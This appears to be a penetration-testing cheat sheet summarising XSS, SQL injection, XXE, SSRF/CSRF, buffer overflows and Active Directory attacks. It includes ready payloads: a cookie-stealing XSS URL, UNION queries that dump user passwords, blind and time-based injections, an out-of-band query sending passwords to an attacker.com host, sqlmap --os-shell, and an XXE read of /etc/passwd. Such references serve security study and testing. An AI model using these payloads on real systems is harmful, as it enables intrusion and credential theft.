Cross-Site Scripting (XSS)

XSS allows an attacker to execute arbitrary JavaScript in the victim's browser. It occurs when the application includes untrusted data in a web page without proper validation or escaping.

The Three Main Types

1. Reflected XSS (Non-Persistent)

The malicious script is reflected off the web server, such as in an error message or search result. The payload is part of the request (URL).

http://target.com/search?q=<script>alert(document.cookie)</script>

2. Stored XSS (Persistent)

The malicious script is permanently stored on the target server. The victim retrieves the malicious script when they view the stored information.

Impact This is the most dangerous type. A single stored payload can compromise thousands of users (e.g., Sammy Worm on MySpace).

3. DOM-Based XSS

The vulnerability exists in the client-side code rather than the server-side code.

// Vulnerable JS Code
var search = document.location.hash.substring(1);
document.write("Results for: " + search);

Defense Mechanisms

  • Content Security Policy (CSP): Restricts sources of loaded resources.
  • Output Encoding: Converting special characters into HTML entities.

SQL Injection (SQLi) Master Reference

SQL Injection is the art of manipulating the interpreter's logic to execute unintended commands.

The Golden Rule If you can trigger a syntax error (e.g., getting "You have an error in your SQL syntax"), you likely have an entry point.

1. In-Band SQLi

A. UNION Based

Step 1: Column Count using ORDER BY.

http://target.com/page?id=1' ORDER BY 3--

Step 2: Injection Point using UNION SELECT.

http://target.com/page?id=1' UNION SELECT 'A', 'B'--

Step 3: Dump Data

' UNION SELECT username, password FROM users--

B. Error-Based

MySQL (UpdateXML):

AND updatexml(null,concat(0x0a,(select version())),null)--

MSSQL (Conversion):

' AND 1=(SELECT TOP 1 table_name FROM information_schema.tables)--

2. Blind SQLi

A. Boolean-Based

' AND SUBSTRING((SELECT password FROM users LIMIT 1), 1, 1) = 'a'--

B. Time-Based

DatabasePayload
MySQL' AND SLEEP(10)--
PostgreSQL' || pg_sleep(10)--
MSSQL' WAITFOR DELAY '0:0:10'--

3. Out-of-Band (OOB)

SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users), '.attacker.com\\foobar'));
SQLMap Cheat Sheet 
sqlmap -u "http://target.com" --dbs
sqlmap -u "http://target.com" --os-shell

XML External Entity (XXE)

XXE arises when an XML processor parses external entities references.

<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>
<foo>&xxe;</foo>

CSRF vs SSRF

CSRF (Client-Side)

Forces the User's Browser to send a request. Relies on cookies.

SSRF (Server-Side)

Forces the Server to send a request to internal networks or cloud metadata.

Buffer Overflows

Overwriting the EIP (Instruction Pointer) on the Stack to redirect execution flow to Shellcode.

  1. Spiking & Fuzzing
  2. Overwriting EIP
  3. NOP Sled (0x90)
  4. Shellcode Execution

Active Directory (AD)

LLMNR Poisoning: Using Responder to capture hashes.

Pass-The-Hash: Authenticating via SMB using NTLM hashes directly.

Golden Ticket: Forging TGTs using the krbtgt hash for persistence.

Lateral Movement

PsExec: Writes binary to ADMIN$. Noisy.

WMI: Uses DCOM/RPC. Stealthy.

WinRM: PowerShell Remoting. Uses HTTP/HTTPS.
